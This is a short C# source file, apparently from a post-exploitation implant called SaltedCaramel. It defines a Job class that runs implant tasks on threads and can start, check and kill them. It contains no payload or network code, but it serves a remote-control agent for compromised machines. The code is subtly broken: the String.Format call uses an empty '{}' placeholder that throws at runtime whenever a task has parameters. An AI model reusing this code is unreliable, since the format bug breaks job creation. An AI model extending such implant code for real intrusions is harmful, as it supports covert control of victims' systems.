using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using SaltedCaramel.Tasks;

namespace SaltedCaramel
{
    namespace Jobs
    {

        /// <summary>
        /// The Job class is responsible for managing
        /// various PostEx jobs. 
        /// </summary>
        public class Job
        {
            static int JobCount = 0;
            public int JobID;
            public int ProcessID;
            public SCTask Task;
            public string TaskString;
            internal Thread _JobThread;

            /// <summary>
            /// Instantiate a Job instance given a task.
            /// </summary>
            /// <param name="task">Task that the job will be responsible for managing.</param>
            /// <param name="agent">Agent that the job belongs to.</param>
            public Job(SCTask task, SCImplant agent)
            {
                JobID = ++JobCount;
                Task = task;
                TaskString = task.command;
                if (task.@params != "")
                {
                    TaskString += String.Format(" {}", task.@params);
                }
                Thread t = new Thread(() => agent.DispatchJob(this));
                _JobThread = t;
            }
            /// <summary>
            /// Begin executing the job.
            /// </summary>
            public void Start()
            {
                _JobThread.Start();
            }

            /// <summary>
            /// Retrieve the status of the job.
            /// </summary>
            /// <returns>TRUE if the job is still running, FALSE otherwise.</returns>
            public bool Status()
            {
                return _JobThread.IsAlive;
            }

            /// <summary>
            /// Kill the task associated with the job.
            /// </summary>
            /// <returns>TRUE if the job is killed successfully, FALSE otherwise</returns>
            public bool Kill()
            {
                try
                {
                    _JobThread.Abort();
                    return true;
                } catch (Exception ex)
                {
                    return false;
                }
            }
        }
    }

}
